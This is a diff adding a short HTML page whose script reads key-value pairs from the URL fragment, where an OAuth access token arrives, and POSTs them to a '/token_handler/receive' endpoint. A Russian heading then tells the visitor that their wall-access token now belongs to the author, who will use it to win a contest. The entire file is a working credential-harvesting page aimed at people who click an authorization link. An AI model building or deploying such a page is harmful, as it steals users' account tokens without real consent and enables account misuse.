@@ -1,0 +1,35 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>АУЕ</title>
+    <script type="application/javascript">
+        function getUrlVars() {
+            var vars = {};
+            var parts = window.location.href.replace(/[#&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
+                vars[key] = value;
+            });
+            return vars;
+        }
+
+        var vars = getUrlVars();
+        var xhr = new XMLHttpRequest();
+        var url = "/token_handler/receive";
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                console.log(JSON);
+            }
+        };
+        var data = JSON.stringify(JSON.stringify(vars));
+        xhr.send(data);
+
+    </script>
+</head>
+<body>
+<h1>Йоу мен спасибо что кликнул, твой токен с доступом только к стене теперь у меня. Обещаю, что не буду им
+    злоупортреблять, а воспользуюсь только для победы в конкурсе. Если ты кликнул по ошибке или передуал - смени пароль,
+    токен перестанет работать.</h1>
+</body>
+</html>
